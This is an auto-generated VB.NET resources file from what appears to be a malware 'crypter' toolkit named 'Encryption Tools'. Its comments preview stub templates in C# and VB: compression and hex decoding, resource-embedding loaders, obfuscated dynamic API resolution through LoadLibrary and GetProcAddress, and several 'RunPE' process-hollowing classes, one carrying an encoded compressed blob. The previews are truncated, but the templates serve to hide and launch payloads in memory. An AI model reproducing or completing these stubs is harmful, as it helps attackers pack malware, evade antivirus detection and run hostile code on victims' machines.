﻿'------------------------------------------------------------------------------
' <auto-generated>
'     This code was generated by a tool.
'     Runtime Version:4.0.30319.18010
'
'     Changes to this file may cause incorrect behavior and will be lost if
'     the code is regenerated.
' </auto-generated>
'------------------------------------------------------------------------------

Option Strict On
Option Explicit On

Imports System

Namespace My.Resources
    
    'This class was auto-generated by the StronglyTypedResourceBuilder
    'class via a tool like ResGen or Visual Studio.
    'To add or remove a member, edit your .ResX file then rerun ResGen
    'with the /str option, or rebuild your VS project.
    '''<summary>
    '''  A strongly-typed resource class, for looking up localized strings, etc.
    '''</summary>
    <Global.System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0"),  _
     Global.System.Diagnostics.DebuggerNonUserCodeAttribute(),  _
     Global.System.Runtime.CompilerServices.CompilerGeneratedAttribute(),  _
     Global.Microsoft.VisualBasic.HideModuleNameAttribute()>  _
    Friend Module Resources
        
        Private resourceMan As Global.System.Resources.ResourceManager
        
        Private resourceCulture As Global.System.Globalization.CultureInfo
        
        '''<summary>
        '''  Returns the cached ResourceManager instance used by this class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend ReadOnly Property ResourceManager() As Global.System.Resources.ResourceManager
            Get
                If Object.ReferenceEquals(resourceMan, Nothing) Then
                    Dim temp As Global.System.Resources.ResourceManager = New Global.System.Resources.ResourceManager("Encryption_Tools_By_GAITH7H3WOLF.Resources", GetType(Resources).Assembly)
                    resourceMan = temp
                End If
                Return resourceMan
            End Get
        End Property
        
        '''<summary>
        '''  Overrides the current thread's CurrentUICulture property for all
        '''  resource lookups using this strongly typed resource class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend Property Culture() As Global.System.Globalization.CultureInfo
            Get
                Return resourceCulture
            End Get
            Set
                resourceCulture = value
            End Set
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to using Microsoft.VisualBasic;
        '''using System;
        '''using System.Collections;
        '''using System.Collections.Generic;
        '''using System.Data;
        '''using System.Diagnostics;
        '''using System.IO.Compression;
        '''using System.IO;
        '''
        '''public class Compression
        '''{
        '''
        '''	public static byte[] Compress(byte[] bytData)
        '''	{
        '''		using (MemoryStream oMS = new MemoryStream()) {
        '''			//GZip object that compress the file 
        '''			using (GZipStream oGZipStream = new GZipStream(oMS, CompressionMode.Compress)) {
        '''				//Write to the Stream object from the buffe [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property CompressC() As String
            Get
                Return ResourceManager.GetString("CompressC", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Public Class Compression
        '''
        '''    Public Shared Function Compress(ByVal bytData() As Byte) As Byte()
        '''        Using oMS As New MemoryStream()
        '''            &apos;GZip object that compress the file 
        '''            Using oGZipStream As New GZipStream(oMS, CompressionMode.Compress)
        '''                &apos;Write to the Stream object from the buffer
        '''                oGZipStream.Write(bytData, 0, bytData.Length)
        '''                oGZipStream.Close()
        '''                ReDim bytData(oMS.ToArray.Length - 1)
        '''                bytData = [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property CompressVB() As String
            Get
                Return ResourceManager.GetString("CompressVB", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to public byte[] FFF1(string F1)
        '''{
        '''	dynamic F2 = null;
        '''	byte[] F3 = null;
        '''	F1 = Strings.Replace(F1, &quot; &quot;, &quot;&quot;);
        '''	F3 = new byte[(Strings.Len(F1) / 2)];
        '''	for (F2 = 0; F2 &lt;= Information.UBound(F3) - 2; F2++) {
        '''		F3[F2] = Convert.ToInt64(&quot;&amp;H&quot; + Strings.Mid(F1, 2 * F2 + 1, 2));
        '''	}
        '''	return F3;
        '''}.
        '''</summary>
        Friend ReadOnly Property H2BC() As String
            Get
                Return ResourceManager.GetString("H2BC", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Function FFF1(ByVal F1 As String) As Byte()
        '''        Dim F2
        '''        Dim F3() As Byte
        '''        F1 = Replace(F1, &quot; &quot;, &quot;&quot;)
        '''        ReDim F3((Len(F1) \ 2) - 1)
        '''        For F2 = 0 To UBound(F3) - 2
        '''            F3(F2) = CLng(&quot;&amp;H&quot; &amp; Mid$(F1, 2 * F2 + 1, 2))
        '''        Next
        '''        FFF1 = F3
        '''    End Function.
        '''</summary>
        Friend ReadOnly Property H2BVB() As String
            Get
                Return ResourceManager.GetString("H2BVB", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Imports System, System.Windows.Forms, System.Diagnostics, System.Text, Microsoft.VisualBasic, System.IO, System.IO.Compression, System.Collections.Generic, System.Runtime.InteropServices.
        '''</summary>
        Friend ReadOnly Property Imporr() As String
            Get
                Return ResourceManager.GetString("Imporr", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to using Microsoft.VisualBasic;
        '''using System;
        '''using System.Collections;
        '''using System.Collections.Generic;
        '''using System.Data;
        '''using System.Diagnostics;
        '''using System.Runtime.InteropServices;
        '''static class ResourceWriter
        '''{
        '''	private static IntPtr ToPtr(object data)
        '''	{
        '''		GCHandle h = GCHandle.Alloc(data, GCHandleType.Pinned);
        '''		IntPtr ptr = default(IntPtr);
        '''		try {
        '''			ptr = h.AddrOfPinnedObject();
        '''		} finally {
        '''			h.Free();
        '''		}
        '''		return ptr;
        '''
        '''	}
        '''
        '''	[DllImport(&quot;kernel32.dll&quot;, SetLastError = true) [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property ResWritCCod() As String
            Get
                Return ResourceManager.GetString("ResWritCCod", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to using Microsoft.VisualBasic;
        '''using System;
        '''using System.Collections;
        '''using System.Collections.Generic;
        '''using System.Data;
        '''using System.Diagnostics;
        '''using System.Runtime.InteropServices;
        '''static class gaaa
        '''{
        '''	[DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
        '''	private static IntPtr FindResource(IntPtr a1, string lpName, string lpType)
        '''	{
        '''	}
        '''	[DllImport(&quot;kernel32&quot;, EntryPoint = &quot;GetModuleHandleA&quot;, CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        '''	private static extern IntPtr a2(s [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property ResWritStubC() As String
            Get
                Return ResourceManager.GetString("ResWritStubC", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Module gaaa
        '''    &lt;DllImport(&quot;kernel32.dll&quot;, SetLastError:=True)&gt; _
        '''    Private Function FindResource(ByVal a1 As IntPtr, ByVal lpName As String, ByVal lpType As String) As IntPtr
        '''    End Function
        '''    Private Declare Function a2 Lib &quot;kernel32&quot; Alias &quot;GetModuleHandleA&quot; (ByVal moduleName As String) As IntPtr
        '''    Private Declare Function SizeofResource Lib &quot;kernel32&quot; (ByVal a1 As IntPtr, ByVal hResInfo As IntPtr) As Integer
        '''    Private Declare Function LoadResource Lib &quot;kernel32&quot; (ByVal a1 As IntPtr, ByVal [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property ResWritStubVB() As String
            Get
                Return ResourceManager.GetString("ResWritStubVB", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Imports System.Runtime.InteropServices
        '''Module ResourceWriter
        '''    Private Function ToPtr(ByVal data As Object) As IntPtr
        '''        Dim h As GCHandle = GCHandle.Alloc(data, GCHandleType.Pinned)
        '''        Dim ptr As IntPtr
        '''        Try
        '''            ptr = h.AddrOfPinnedObject()
        '''        Finally
        '''            h.Free()
        '''        End Try
        '''        Return ptr
        '''
        '''    End Function
        '''
        '''    &lt;DllImport(&quot;kernel32.dll&quot;, SetLastError:=True)&gt; _
        '''    Private Function UpdateResource(ByVal hUpdate As IntPtr, ByVal lpType As String [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property ResWritVBCode() As String
            Get
                Return ResourceManager.GetString("ResWritVBCode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to using System.Text;
        '''using System.Runtime.InteropServices;
        '''public class alaa {
        '''    
        '''    [DllImport(&quot;kernel32.dll&quot;, EntryPoint=&quot;LoadLibraryA&quot;)]
        '''    public static extern IntPtr apii9(string name);
        '''    
        '''    [DllImport(&quot;kernel32.dll&quot;, EntryPoint=&quot;GetProcAddress&quot;)]
        '''    public static extern IntPtr apii0(IntPtr handle, string name);
        '''    
        '''    void CreateAPI(void Of, void T) {
        '''        ((string)(name));
        '''        ((string)(method));
        '''        T;
        '''        return;
        '''        Marshal.GetDelegateForFunctionPointer(a [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property RunPE1C() As String
            Get
                Return ResourceManager.GetString("RunPE1C", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Public Class alaa
        '''    Public Declare Function apii9 Lib &quot;kernel32&quot; Alias &quot;LoadLibraryA&quot; (ByVal name As String) As IntPtr
        '''    Public Declare Function apii0 Lib &quot;kernel32&quot; Alias &quot;GetProcAddress&quot; (ByVal handle As IntPtr, ByVal name As String) As IntPtr
        '''    Function CreateAPI(Of T)(ByVal name As String, ByVal method As String) As T
        '''        Return DirectCast(DirectCast(Marshal.GetDelegateForFunctionPointer(apii0(apii9(name), method), GetType(T)), Object), T)
        '''    End Function
        '''    Delegate Function apii1(ByV [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property RunPE1VB() As String
            Get
                Return ResourceManager.GetString("RunPE1VB", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to using System;
        '''using System.Collections.Generic;
        '''using System.Text;
        '''using System.Reflection;
        '''using System.IO.Compression;
        '''using System.IO;
        '''public class ClassName
        '''{
        '''
        '''    private static string a1 = &quot;AFgAAB+LCAAAAAAABADtvQdgHEmWJSYvbcp7f0r1StfgdKEIgGATJNiQQBDswYjN5pLsHWlHIymrKoHKZVZlXWYWQMztnbz33nvvv&quot; + &quot;ffee++997o7nU4n99//P1xmZAFs9s5K2smeIYCqyB8/fnwfPyLe/OQv+onj4y+O6TnFP3fvHhwfP784Ns9P2N9u98ib++fri/3j9&quot; + &quot;nj54mxy8eTNFzvzn/x8vppeP7maLh4up4tn7dnnL+aTxf3L2cmT4qdeP7mefXf/IqP/vzp9+Obs893Ln/r8q/XTn9j5vb5jI [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property RunPE2C() As String
            Get
                Return ResourceManager.GetString("RunPE2C", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Public Module ModuleNAme
        '''    Private RunPE As String = &quot;AFgAAB+LCAAAAAAABADtvQdgHEmWJSYvbcp7f0r1StfgdKEIgGATJNiQQBDswYjN5pLsHWlHIymrKoHKZVZlXWYWQMztnbz33nvvv&quot; &amp; _
        '''        &quot;ffee++997o7nU4n99//P1xmZAFs9s5K2smeIYCqyB8/fnwfPyLe/OQv+onj4y+O6TnFP3fvHhwfP784Ns9P2N9u98ib++fri/3j9&quot; &amp; _
        '''        &quot;nj54mxy8eTNFzvzn/x8vppeP7maLh4up4tn7dnnL+aTxf3L2cmT4qdeP7mefXf/IqP/vzp9+Obs893Ln/r8q/XTn9j5vb5jIT/5i&quot; &amp; _
        '''        &quot;Vc/cXz85vj06fHJwU+8Kr1Ov6T/F6fPj3+iOT5+eoVPTvWb4wdlZdH6ffSzU4Mm/fvEQbHvHB+f2O/l+eL4J86+ksb6wqn+nx8PC&quot; &amp; _        ''' [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property RunPE2VB() As String
            Get
                Return ResourceManager.GetString("RunPE2VB", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to using Microsoft.VisualBasic;
        '''using System;
        '''using System.Collections;
        '''using System.Collections.Generic;
        '''using System.Data;
        '''using System.Diagnostics;
        '''using System.Runtime.InteropServices;
        '''using System.Text;
        '''
        '''public class RunPEClas
        '''{
        '''	[DllImport(&quot;kernel32&quot;)]
        '''	[return: MarshalAs(UnmanagedType.Bool)]
        '''	private static extern bool V1(string V2, StringBuilder V3, IntPtr V4, IntPtr V5, 	[MarshalAs(UnmanagedType.Bool)]
        '''bool inherit, int creation, IntPtr env, string V6, byte[] V7, IntPtr[] V8);
        '''	[DllImpo [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property RunPE3C() As String
            Get
                Return ResourceManager.GetString("RunPE3C", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Public Class RunPEClas
        '''    &lt;DllImport(&quot;kernel32&quot;)&gt; _
        '''    Private Shared Function V1(ByVal V2 As String, ByVal V3 As StringBuilder, ByVal V4 As IntPtr, ByVal V5 As IntPtr, &lt;MarshalAs(UnmanagedType.Bool)&gt; ByVal inherit As Boolean, ByVal creation As Integer, _
        '''        ByVal env As IntPtr, ByVal V6 As String, ByVal V7 As Byte(), ByVal V8 As IntPtr()) As &lt;MarshalAs(UnmanagedType.Bool)&gt; Boolean
        '''    End Function
        '''    &lt;DllImport(&quot;kernel32&quot;)&gt; _
        '''    Private Shared Function V9(ByVal hThr As IntPtr, ByVal ctxt As  [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property RunPE3VB() As String
            Get
                Return ResourceManager.GetString("RunPE3VB", resourceCulture)
            End Get
        End Property
    End Module
End Namespace
